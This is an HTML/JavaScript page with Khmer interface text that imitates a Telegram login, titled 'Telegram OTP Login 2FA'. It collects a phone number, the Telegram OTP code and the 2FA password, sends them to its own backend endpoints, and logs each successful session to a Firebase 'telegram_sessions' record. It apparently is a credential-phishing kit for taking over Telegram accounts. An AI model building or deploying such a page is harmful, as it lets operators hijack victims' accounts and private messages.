<!DOCTYPE html>
<html lang="km">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram OTP Login 2FA</title>

<style>
body {
  font-family:'Segoe UI',sans-serif;
  background:linear-gradient(135deg,#6fc1fc,#fff);
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}

.login-container {
  background:#fff;
  border-radius:20px;
  width:380px;
  max-width:90%;
  padding:40px 30px;
  box-shadow:0 12px 30px rgba(0,0,0,0.2);
  text-align:center;
}

.logo {
  width:80px;
  height:80px;
  margin:0 auto 20px;
  background:#0088cc;
  border-radius:50%;
  display:flex;
  justify-content:center;
  align-items:center;
  color:white;
  font-size:36px;
  font-weight:bold;
}

h2 { margin:0 0 20px; color:#333; }

input {
  width:100%;
  padding:14px;
  margin:10px 0;
  border-radius:10px;
  border:1px solid #ccc;
  font-size:16px;
}

input:focus {
  outline:none;
  border-color:#0088cc;
}

button {
  width:100%;
  padding:14px;
  margin:10px 0;
  border-radius:10px;
  font-size:16px;
  font-weight:600;
  background:#0088cc;
  color:white;
  border:none;
  cursor:pointer;
}

button:hover { background:#006fa1; }

#message {
  margin-top:10px;
  font-size:14px;
}
</style>
</head>

<body>

<div class="login-container">
  <div class="logo">T</div>
  <h2>Telegram OTP Login 2FA</h2>

  <!-- STEP 1 -->
  <div id="step-phone">
    <input type="text" id="phone" placeholder="លេខទូរស័ព្ទ">
    <button id="btn-next">Send OTP</button>
  </div>

  <!-- STEP 2 -->
  <div id="step-otp" style="display:none;">
    <input type="text" id="otp" placeholder="OTP Code">

    <input type="password"
      id="password"
      placeholder="2FA password (បើមាន)"
      style="display:none;">

    <button id="btn-login">Login</button>
  </div>

  <p id="message"></p>
</div>

<!-- Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "YOUR_KEY",
  authDomain: "YOUR_AUTH",
  databaseURL: "YOUR_DB",
  projectId: "YOUR_ID"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
</script>

<script>
let currentPhone = '';

const stepPhone = document.getElementById('step-phone');
const stepOtp = document.getElementById('step-otp');
const message = document.getElementById('message');

const passwordInput = document.getElementById('password');

// ================= STEP 1: SEND OTP =================
document.getElementById('btn-next').addEventListener('click', async () => {
  const phone = document.getElementById('phone').value.trim();

  if (!phone) {
    message.textContent = "សូមបញ្ចូលលេខទូរស័ព្ទ";
    return;
  }

  currentPhone = phone;

  message.textContent = "កំពុងផ្ញើ OTP...";

  try {
    const res = await fetch('/send-otp', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ phone })
    });

    const data = await res.json();

    if (data.success) {
      stepPhone.style.display = 'none';
      stepOtp.style.display = 'block';
      message.textContent = "OTP បានផ្ញើ!";
    } else {
      message.textContent = data.error || "Fail to send OTP";
    }

  } catch (err) {
    message.textContent = "Server error";
  }
});


// ================= STEP 2: LOGIN =================
document.getElementById('btn-login').addEventListener('click', async () => {
  const otp = document.getElementById('otp').value.trim();

  if (!otp) {
    message.textContent = "សូមបញ្ចូល OTP";
    return;
  }

  message.textContent = "កំពុង verify...";

  try {
    const res = await fetch('/login', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({
        phone: currentPhone,
        otp
      })
    });

    const data = await res.json();

    // ================= 2FA REQUIRED =================
    if (data.requirePassword) {
      passwordInput.style.display = 'block';
      message.textContent = "សូមបញ្ចូល 2FA password";
      return;
    }

    // ================= SUCCESS (NO 2FA) =================
    if (data.success) {
      message.textContent = "Login Success";

      db.ref('telegram_sessions').push({
        phone: currentPhone,
        status: "success",
        has2FA: "nopass",
        timestamp: Date.now()
      });

      resetForm();
    }

  } catch (err) {
    message.textContent = "Server error";
  }
});


// ================= OPTIONAL 2FA SUBMIT =================
passwordInput.addEventListener('keypress', async (e) => {
  if (e.key === 'Enter') {
    const password = passwordInput.value.trim();

    message.textContent = "កំពុង verify 2FA...";

    try {
      const res = await fetch('/login-password', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          phone: currentPhone,
          password
        })
      });

      const data = await res.json();

      if (data.success) {
        message.textContent = "Login Success (2FA)";

        db.ref('telegram_sessions').push({
          phone: currentPhone,
          status: "success",
          has2FA: "pass",
          timestamp: Date.now()
        });

        resetForm();
      } else {
        message.textContent = data.message;
      }

    } catch (err) {
      message.textContent = "2FA error";
    }
  }
});


// ================= RESET =================
function resetForm() {
  document.getElementById('phone').value = '';
  document.getElementById('otp').value = '';
  passwordInput.value = '';
  passwordInput.style.display = 'none';

  stepOtp.style.display = 'none';
  stepPhone.style.display = 'block';

  currentPhone = '';
}
</script>

</body>
</html>
